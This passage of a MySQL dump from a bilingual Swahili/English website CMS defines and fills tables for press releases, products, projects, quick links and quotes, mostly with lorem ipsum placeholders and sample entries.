INSERT INTO `preferences` (`id`, `feedback_email`, `whistle_email`, `show_loading`, `logo`, `member_icon`, `project_icon`, `university_icon`, `school_icon`, `user_id`, `created_at`, `updated_at`) VALUES
(5, 'info@hst.go.tz', 'report@hst.go.tz', 1, NULL, 'C:\\xampp\\tmp\\php14BB.tmp', NULL, NULL, NULL, 0, '2022-03-11 03:49:56', '2022-10-14 10:14:07');

-- --------------------------------------------------------

--
-- Table structure for table `press_releases`
--

CREATE TABLE `press_releases` (
  `id` int(10) UNSIGNED NOT NULL,
  `name_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `name_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `content_sw` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `content_en` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `file_en` varchar(150) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `file_sw` varchar(150) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `active` tinyint(1) NOT NULL DEFAULT 1,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `user_id` int(11) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `press_releases`
--

INSERT INTO `press_releases` (`id`, `name_sw`, `name_en`, `content_sw`, `content_en`, `file_en`, `file_sw`, `active`, `slug`, `user_id`, `created_at`, `updated_at`) VALUES
(4, 'AWARDED CONTRACTS 2020-2021', 'AWARDED CONTRACTS 2020-2021', '<p><a href=\"https://tira.go.tz/content/awarded-contracts-2020-2021\">AWARDED CONTRACTS 2020-2021</a></p>', '<p><a href=\"https://tira.go.tz/content/awarded-contracts-2020-2021\">AWARDED CONTRACTS 2020-2021</a></p>', '/uploads/press_releases/en1627887240-INSTITUTE OF CONSTRUCTION TECHNOLOGY Website.docx', '/uploads/press_releases/sw1627887240-INSTITUTE OF CONSTRUCTION TECHNOLOGY Website.docx', 1, 'mapitio-ya-kikao-kazi-cha-utendaji-wa-tnbc', 1, '2021-08-02 03:54:00', '2022-08-07 11:02:53'),
(5, 'AWARDED CONTRACTS 2021-2022 semi annual', 'AWARDED CONTRACTS 2021-2022 semi annual', '<p><a href=\"https://tira.go.tz/content/awarded-contracts-2021-2022-semi-annual\">AWARDED CONTRACTS 2021-2022 semi annual</a></p>', '<p><a href=\"https://tira.go.tz/content/awarded-contracts-2021-2022-semi-annual\">AWARDED CONTRACTS 2021-2022 semi annual</a></p>', '/uploads/press_releases/en1659880909-AWARDED CONTRACTS 2021-2022 semi annual.pdf', '/uploads/press_releases/sw1659880909-AWARDED CONTRACTS 2021-2022 semi annual.pdf', 1, 'mapitio-ya-kikao-kazi-cha-utendaji-wa-tnbc-2', 1, '2021-08-02 04:04:15', '2022-08-07 11:01:49');

-- --------------------------------------------------------

--
-- Table structure for table `products`
--

CREATE TABLE `products` (
  `id` int(10) UNSIGNED NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `summary_en` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `summary_sw` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `content_en` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `content_sw` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `price` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `photo_url` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `category_id` int(11) NOT NULL,
  `active` tinyint(1) NOT NULL DEFAULT 1,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `products`
--

INSERT INTO `products` (`id`, `title_en`, `title_sw`, `summary_en`, `summary_sw`, `content_en`, `content_sw`, `price`, `photo_url`, `category_id`, `active`, `slug`, `created_at`, `updated_at`) VALUES
(4, 'Scissors', 'Mkasi', 'Scissors', 'Mkasi', NULL, NULL, '10000', '/uploads/products/0d1eba692467e4ee491e0974d871223d.jpeg', 2, 1, 'scissors', '2022-01-09 06:05:22', '2022-01-09 06:14:03'),
(5, 'X-ray Machine', 'Machine ya X-ray', 'An X-ray machine is any machine that involves X-rays. It may consist of an X-ray generator and an X-ray detector.', 'An X-ray machine is any machine that involves X-rays. It may consist of an X-ray generator and an X-ray detector.', '<h2>What is Lorem Ipsum?</h2>\r\n\r\n<p><strong>Lorem Ipsum</strong>&nbsp;is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry&#39;s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.</p>\r\n\r\n<h2>Why do we use it?</h2>\r\n\r\n<p>It is a long established fact that a reader will be distracted by the readable content of a page when looking at its layout. The point of using Lorem Ipsum is that it has a more-or-less normal distribution of letters, as opposed to using &#39;Content here, content here&#39;, making it look like readable English. Many desktop publishing packages and web page editors now use Lorem Ipsum as their default model text, and a search for &#39;lorem ipsum&#39; will uncover many web sites still in their infancy. Various versions have evolved over the years, sometimes by accident, sometimes on purpose (injected humour and the like).</p>', '<h2>What is Lorem Ipsum?</h2>\r\n\r\n<p><strong>Lorem Ipsum</strong>&nbsp;is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry&#39;s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.</p>\r\n\r\n<h2>Why do we use it?</h2>\r\n\r\n<p>It is a long established fact that a reader will be distracted by the readable content of a page when looking at its layout. The point of using Lorem Ipsum is that it has a more-or-less normal distribution of letters, as opposed to using &#39;Content here, content here&#39;, making it look like readable English. Many desktop publishing packages and web page editors now use Lorem Ipsum as their default model text, and a search for &#39;lorem ipsum&#39; will uncover many web sites still in their infancy. Various versions have evolved over the years, sometimes by accident, sometimes on purpose (injected humour and the like).</p>', '5000', '/uploads/products/515cc8f8fc408e148faf3ae3442c1671.jpeg', 2, 1, 'x-ray-machine', '2022-01-09 06:05:22', '2022-01-09 14:21:47');

-- --------------------------------------------------------

--
-- Table structure for table `product_categories`
--

CREATE TABLE `product_categories` (
  `id` int(10) UNSIGNED NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `summary_en` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `summary_sw` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `photo_url` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `active` tinyint(1) NOT NULL DEFAULT 1,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `product_categories`
--

INSERT INTO `product_categories` (`id`, `title_en`, `title_sw`, `summary_en`, `summary_sw`, `photo_url`, `active`, `slug`, `created_at`, `updated_at`) VALUES
(2, 'Tools and Equipments', 'Vifaa vya kitabibu', 'Tools and Equipments', 'Vifaa vya kitabibu', '/uploads/product-categories/7f74f6a100ab66cb50dea85e562f3b66.jpeg', 1, 'tools-and-equipments', '2022-01-09 06:00:56', '2022-01-09 06:00:56'),
(3, 'Pain Killers', 'Dawa za Kupunguza Makali', 'Pain Killers Summary here', 'Dawa za Kupunguza Makali zinapatikana', '/uploads/product-categories/58119d1f984a049ea85942769c330500.jpeg', 1, 'pain-killers', '2022-01-09 08:40:22', '2022-01-09 08:40:22');

-- --------------------------------------------------------

--
-- Table structure for table `projects`
--

CREATE TABLE `projects` (
  `id` int(10) UNSIGNED NOT NULL,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `summary_sw` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `summary_en` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `content_sw` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `content_en` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `photo_url` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `icon` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `active` tinyint(1) NOT NULL DEFAULT 1,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `user_id` int(11) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `projects`
--

INSERT INTO `projects` (`id`, `title_sw`, `title_en`, `summary_sw`, `summary_en`, `content_sw`, `content_en`, `photo_url`, `icon`, `active`, `slug`, `user_id`, `created_at`, `updated_at`) VALUES
(2, 'Project 2', 'Project 2', NULL, NULL, '<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;</p>\r\n\r\n<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;</p>', '<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;</p>\r\n\r\n<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;</p>', '8b9a3188d69c74561a9f595cbd102f51.jpeg', 'icon-1665921281-done-all-svgrepo-com.svg', 1, 'project-2', 0, '2021-10-14 03:48:28', '2022-10-16 08:54:41'),
(3, 'Project 1', 'Project 1', NULL, NULL, '<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;</p>\r\n\r\n<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;</p>', '<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;</p>\r\n\r\n<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;</p>', 'e3cb831613d628a367aad81fdfbea14a.jpeg', 'icon-1665921260-book.svg', 1, 'project-1', 0, '2021-10-14 03:50:51', '2022-10-16 08:54:20'),
(4, 'Project 3', 'Project 3', NULL, NULL, '<p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Maxime mollitia, molestiae quas vel sint commodi repudiandae consequuntur voluptatum laborum numquam blanditiis harum quisquam eius sed odit fugiat iusto fuga praesentium optio, eaque rerum! Provident similique accusantium nemo autem. Veritatis obcaecati tenetur iure eius earum ut molestias architecto voluptate aliquam nihil, eveniet aliquid culpa officia aut! Impedit sit sunt quaerat, odit, tenetur error, harum nesciunt ipsum debitis quas aliquid. Reprehenderit, quia. Quo neque error repudiandae fuga? Ipsa laudantium molestias eos sapiente officiis modi at sunt excepturi expedita sint? Sed quibusdam recusandae alias error harum maxime adipisci amet laborum. Perspiciatis minima nesciunt dolorem! Officiis iure rerum voluptates a cumque velit</p>', '<p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Maxime mollitia, molestiae quas vel sint commodi repudiandae consequuntur voluptatum laborum numquam blanditiis harum quisquam eius sed odit fugiat iusto fuga praesentium optio, eaque rerum! Provident similique accusantium nemo autem. Veritatis obcaecati tenetur iure eius earum ut molestias architecto voluptate aliquam nihil, eveniet aliquid culpa officia aut! Impedit sit sunt quaerat, odit, tenetur error, harum nesciunt ipsum debitis quas aliquid. Reprehenderit, quia. Quo neque error repudiandae fuga? Ipsa laudantium molestias eos sapiente officiis modi at sunt excepturi expedita sint? Sed quibusdam recusandae alias error harum maxime adipisci amet laborum. Perspiciatis minima nesciunt dolorem! Officiis iure rerum voluptates a cumque velit</p>', '2303ec09f460beb70479fe7c8ac5d4d3.jpeg', 'icon-1665921157-code.svg', 1, 'project-3', 0, '2022-10-15 12:33:41', '2022-10-16 08:52:37');

-- --------------------------------------------------------

--
-- Table structure for table `quicklink_categories`
--

CREATE TABLE `quicklink_categories` (
  `id` int(10) UNSIGNED NOT NULL,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `content` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `active` tinyint(1) NOT NULL DEFAULT 1,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `quick_infos`
--

CREATE TABLE `quick_infos` (
  `id` int(10) UNSIGNED NOT NULL,
  `info_en` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `info_sw` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `active` tinyint(1) NOT NULL DEFAULT 1,
  `user_id` int(11) NOT NULL,
  `url` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `quick_infos`
--

INSERT INTO `quick_infos` (`id`, `info_en`, `info_sw`, `active`, `user_id`, `url`, `slug`, `created_at`, `updated_at`) VALUES
(2, 'Cheza kwa busara na kwa kujali', 'Cheza kwa busara na kwa kujali', 1, 1, '', 'cheza-kwa-busara-na-kwa-kujali', '2022-03-10 08:21:52', '2022-03-10 08:21:52'),
(3, 'Michezo ya kubahatisha siyo mbadala wa ajira walachanzo cha mapato bali ni sehemu ya burudani', 'Michezo ya kubahatisha siyo mbadala wa ajira walachanzo cha mapato bali ni sehemu ya burudani', 1, 1, '', 'michezo-ya-kubahatisha-siyo-mbadala-wa-ajira-walachanzo-cha-mapato-bali-ni-sehemu-ya-burudani', '2022-03-10 08:22:22', '2022-03-10 08:22:22'),
(4, 'Michezo ya kubahatisha siyo mbadala wa ajira walachanzo cha mapato bali ni sehemu ya burudani', 'Michezo ya kubahatisha siyo mbadala wa ajira walachanzo cha mapato bali ni sehemu ya burudani', 1, 1, '', 'michezo-ya-kubahatisha-siyo-mbadala-wa-ajira-walachanzo-cha-mapato-bali-ni-sehemu-ya-burudani-2', '2022-03-10 08:22:22', '2022-03-10 08:22:22');

-- --------------------------------------------------------

--
-- Table structure for table `quick_links`
--

CREATE TABLE `quick_links` (
  `id` int(10) UNSIGNED NOT NULL,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `link` tinyint(1) NOT NULL DEFAULT 0,
  `url` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `url_external` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `active` tinyint(1) NOT NULL DEFAULT 1,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `parent` int(11) NOT NULL DEFAULT 0,
  `position` int(11) NOT NULL DEFAULT 1,
  `category_id` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `quick_links`
--

INSERT INTO `quick_links` (`id`, `title_sw`, `title_en`, `link`, `url`, `url_external`, `active`, `created_at`, `updated_at`, `parent`, `position`, `category_id`) VALUES
(5, 'Home', 'Home', 1, '#', NULL, 1, '2021-07-28 06:22:43', '2022-08-10 02:01:54', 0, 1, 0),
(6, 'What we Do?', 'What we Do?', 1, 'pages/what-we-do', NULL, 1, '2022-08-10 02:00:44', '2022-08-10 02:02:04', 0, 5, 0),
(7, 'Who we Are?', 'Who we Are?', 1, 'pages/who-we-are', NULL, 1, '2022-08-10 02:01:03', '2022-08-10 02:02:16', 0, 6, 0),
(8, 'Who we Serve?', 'Who we Serve?', 1, 'pages/who-we-serve', NULL, 1, '2022-08-10 02:01:34', '2022-08-10 02:02:29', 0, 7, 0);

-- --------------------------------------------------------

--
-- Table structure for table `quotes`
--

CREATE TABLE `quotes` (
  `id` int(10) UNSIGNED NOT NULL,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `summary_sw` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `summary_en` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `content_sw` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `content_en` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `active` tinyint(1) NOT NULL DEFAULT 1,
  `user_id` int(11) NOT NULL,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `photo_url` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `quotes`
--

INSERT INTO `quotes` (`id`, `title_sw`, `title_en`, `summary_sw`, `summary_en`, `content_sw`, `content_en`, `active`, `user_id`, `slug`, `photo_url`, `created_at`, `updated_at`) VALUES
(3, 'Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika', 'Changes in Second Stakeholders General Meetings and more', '', NULL, '<p>Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;</p>', '<p>Changes in Second Stakeholders General Meeting&nbsp;&nbsp;Changes in Second Stakeholders General Meeting&nbsp;&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;</p>', 1, 1, 'changes-in-second-stakeholders-general-meeting-2', 'efd8652e33a4858bc5fb87f1e0deadae', '2021-09-02 02:58:21', '2022-06-22 03:52:35'),
